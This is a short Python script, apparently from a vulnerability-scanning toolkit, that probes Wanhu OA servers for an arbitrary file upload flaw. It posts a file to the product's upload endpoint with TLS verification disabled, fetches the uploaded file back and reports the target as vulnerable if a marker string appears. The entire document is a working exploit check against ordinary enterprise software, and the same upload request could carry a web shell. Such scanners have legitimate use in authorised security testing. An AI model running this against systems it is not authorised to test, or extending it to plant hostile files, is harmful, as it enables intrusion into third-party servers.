#!/usr/bin/env python
# coding=utf-8
#万户OA任意文件上传
import base64
from termcolor import colored
import requests,threading
requests.packages.urllib3.disable_warnings()  #忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    files = {
        'file': open('poc/OA/wanghuOA/test.txt', 'rb')
    }
    try:
        response = requests.post(url +'/defaultroot/upload/fileUpload.controller',files=files,verify=False,timeout=20)
        list_re = response.json()#获取接受后到的参数
        if '"fileSize":' in response.text and '"result":"success"' in response.text:
            responses = requests.get(url=url+'/defaultroot/upload/html/'+str(list_re['data']))#拼接参数
            if "scan_vlud" in responses.text:
                print(colored('[+]存在万户OA任意文件上传', 'red'))
                results = f'{urls}-->存在万户OA任意文件上传'
        else:
            print('[-]不存在万户OA任意文件上传')
    except:
        print('[-]不存在万户OA任意文件上传')

def WHOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
